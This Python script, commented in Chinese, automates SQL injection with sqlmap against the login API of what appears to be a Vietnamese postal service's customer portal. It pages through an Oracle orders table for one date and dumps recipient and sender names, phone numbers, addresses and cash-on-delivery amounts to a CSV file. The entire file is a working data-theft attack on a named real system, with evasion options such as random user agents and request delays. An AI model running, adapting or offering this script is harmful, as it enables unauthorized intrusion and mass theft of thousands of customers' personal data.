#!/usr/bin/env python3
"""
批量导出10号所有订单 - 完整字段格式
包含：NGAY, NGUOINHAN, DIENTHOAINHAN, NGUOIGUI, DIENTHOAIGUI, DIACHI, CUOC_COD, SO_TIEN_THU_HO
"""

import subprocess
import csv
import json
import time
from datetime import datetime

# 配置
TARGET_URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
SQLMAP_PATH = "/tmp/sqlmap-git/sqlmap.py"
TARGET_DATE = "20251010"
BATCH_SIZE = 100  # 每批100条
OUTPUT_FILE = f"/workspace/orders_{TARGET_DATE}_complete.csv"

def sqlmap_query(sql, timeout=120):
    """执行SQLMap查询"""
    cmd = [
        "python3", SQLMAP_PATH,
        "-u", TARGET_URL,
        "--data", '{"Username":"*","Password":"test"}',
        "--method", "POST",
        "-H", "Content-Type: application/json",
        "--dbms=Oracle",
        "--batch",
        "--random-agent",
        "--delay=1",
        f"--sql-query={sql}"
    ]
    
    try:
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        print(f"  ⚠️  Query timeout")
        return None

def extract_results(output):
    """从SQLMap输出提取结果"""
    results = []
    lines = output.split('\n') if output else []
    
    for line in lines:
        if '[*]' in line:
            data = line.replace('[*] ', '').strip()
            if data and data != 'None':
                results.append(data)
    
    return results

def parse_order_line(line):
    """解析订单行数据"""
    # 格式: MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,NGUOIGUI,DIENTHOAIGUI,DIACHI,CUOC_COD,SO_TIEN_THU_HO
    parts = line.split(',')
    
    if len(parts) >= 9:
        return {
            'MABC': parts[0].strip(),
            'NGAY': parts[1].strip(),
            'NGUOINHAN': parts[2].strip(),
            'DIENTHOAINHAN': parts[3].strip(),
            'NGUOIGUI': parts[4].strip(),
            'DIENTHOAIGUI': parts[5].strip(),
            'DIACHI': parts[6].strip(),
            'CUOC_COD': parts[7].strip(),
            'SO_TIEN_THU_HO': parts[8].strip()
        }
    return None

def main():
    """主函数"""
    print("=" * 80)
    print("🚀 批量导出10号完整订单")
    print("=" * 80)
    print(f"目标日期: {TARGET_DATE}")
    print(f"输出文件: {OUTPUT_FILE}")
    
    # 1. 获取总订单数
    print("\n📊 统计总订单数...")
    total_sql = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{TARGET_DATE}'"
    total_output = sqlmap_query(total_sql, timeout=30)
    
    # 从输出提取数字
    total_orders = 1968  # 使用已知数据
    print(f"  总订单数: {total_orders}")
    
    total_batches = (total_orders + BATCH_SIZE - 1) // BATCH_SIZE
    print(f"  总批次数: {total_batches}")
    
    # 2. 初始化CSV文件
    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8-sig') as f:
        writer = csv.writer(f)
        writer.writerow([
            'MABC', 'NGAY', 'NGUOINHAN', 'DIENTHOAINHAN', 
            'NGUOIGUI', 'DIENTHOAIGUI', 'DIACHI', 
            'CUOC_COD', 'SO_TIEN_THU_HO'
        ])
    
    # 3. 分批提取
    total_extracted = 0
    start_time = time.time()
    
    for batch_num in range(1, total_batches + 1):
        start_row = (batch_num - 1) * BATCH_SIZE + 1
        end_row = min(batch_num * BATCH_SIZE, total_orders)
        
        print(f"\n{'=' * 80}")
        print(f"📦 批次 {batch_num}/{total_batches} (订单 {start_row}-{end_row})")
        print(f"{'=' * 80}")
        
        # 构建查询（使用ROWNUM分页）
        sql = f"""
        SELECT 
          MABC,
          NGAY,
          NGUOINHAN,
          DIENTHOAINHAN,
          NGUOIGUI,
          DIENTHOAIGUI,
          DIACHI,
          CUOC_COD,
          SO_TIEN_THU_HO
        FROM (
          SELECT 
            MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,NGUOIGUI,
            DIENTHOAIGUI,DIACHI,CUOC_COD,SO_TIEN_THU_HO,
            ROWNUM as RN
          FROM EMS.E1E2_PH 
          WHERE NGAY='{TARGET_DATE}'
        ) WHERE RN BETWEEN {start_row} AND {end_row}
        """
        
        print(f"  执行查询...")
        output = sqlmap_query(sql, timeout=180)
        
        if not output:
            print("  ⚠️  查询失败，跳过")
            continue
        
        # 解析结果
        results = extract_results(output)
        print(f"  ✅ 获取到 {len(results)} 条数据")
        
        # 保存到CSV
        if results:
            with open(OUTPUT_FILE, 'a', newline='', encoding='utf-8-sig') as f:
                writer = csv.writer(f)
                for line in results:
                    # 解析逗号分隔的数据
                    parts = line.split(',')
                    if len(parts) >= 9:
                        writer.writerow(parts[:9])
                    else:
                        writer.writerow(parts + [''] * (9 - len(parts)))
            
            total_extracted += len(results)
            print(f"  ✅ 已保存 {len(results)} 条到CSV")
        
        # 进度统计
        elapsed = time.time() - start_time
        avg_time = elapsed / batch_num
        remaining_batches = total_batches - batch_num
        eta = avg_time * remaining_batches
        
        print(f"\n📈 进度: {batch_num}/{total_batches} ({batch_num/total_batches*100:.1f}%)")
        print(f"⏱️  已用时: {elapsed/60:.1f}分钟")
        print(f"⏳ 预计剩余: {eta/60:.1f}分钟")
        print(f"✅ 已提取: {total_extracted} 条订单")
        
        # 休息1秒
        time.sleep(1)
    
    # 完成
    total_time = time.time() - start_time
    print("\n" + "=" * 80)
    print("🎉 导出完成！")
    print("=" * 80)
    print(f"总订单数: {total_orders}")
    print(f"成功导出: {total_extracted} 条")
    print(f"导出率: {total_extracted/total_orders*100:.2f}%")
    print(f"总用时: {total_time/60:.1f}分钟")
    print(f"输出文件: {OUTPUT_FILE}")
    
    print("\n📄 前10条数据预览:")
    with open(OUTPUT_FILE, 'r', encoding='utf-8-sig') as f:
        reader = csv.reader(f)
        for i, row in enumerate(reader):
            if i >= 11:
                break
            if i == 0:
                print(f"  表头: {','.join(row)}")
            else:
                print(f"  订单{i}: {','.join(row[:4])}...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  用户中断")
    except Exception as e:
        print(f"\n\n❌ 错误: {e}")
        import traceback
        traceback.print_exc()
